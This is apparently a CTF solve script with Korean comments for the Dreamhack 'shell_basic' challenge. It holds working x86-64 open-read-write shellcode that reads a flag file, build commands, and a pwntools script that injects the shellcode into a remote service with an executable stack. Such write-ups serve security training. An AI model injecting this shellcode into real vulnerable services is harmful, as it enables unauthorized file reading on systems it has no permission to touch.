'''
[Dreamhack] shell_basic
1. 취약점: rwx 스택 영역이 있고, 사용자 입력값을 실행하므로 쉘 코드 삽입 가능
2. 시나리오: execve, execveat 함수 사용이 제한되므로, orw 쉘 코드를 통해 flag 파일 읽고 출력하기
3. 페이로드 구조: [ orw shellcode ]
'''

'''
[ ORW 쉘 코드 (orw.asm) ]
; [1] open('/home/shell_basic/flag_name_is_loooooong', O_RDONLY, NULL)
push 0x00
mov rax, 0x676E6F6F6F6F6F6F
push rax
mov rax, 0x6C5F73695F656D61
push rax
mov rax, 0x6E5F67616C662F63
push rax
mov rax, 0x697361625F6C6C65
push rax
mov rax, 0x68732F656D6F682F
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

; [2] read(fd, buf, 0x30)
mov rdi, rax
lea rsi, [rsp - 0x30]
mov rdx, 0x30
mov rax, 0
syscall

; [3] write(1, buf, 0x30)
mov rdi, 1
mov rax, 1
syscall

xor rdi, rdi    ; rdi = 0
mov rax, 0x3C   ; rax = sys_exit
syscall         ; exit(0)
'''
# nasm -f elf64 orw.asm 명령어를 통해 어셈블리 파일을 오브젝트 파일로 생성 가능
# objcopy --dump-section .text=orw.bin orw.o 명령어를 통해 오브젝트 파일을 바이너리 파일로 생성 가능

from pwn import *

context.log_level = 'debug'

with open('./orw.bin', 'rb') as f:
    sh_dump = f.read()

    # p = process('./shell_basic')
    p = remote('IP', 1234)

    p.sendafter(b'shellcode: ', sh_dump)

    p.interactive()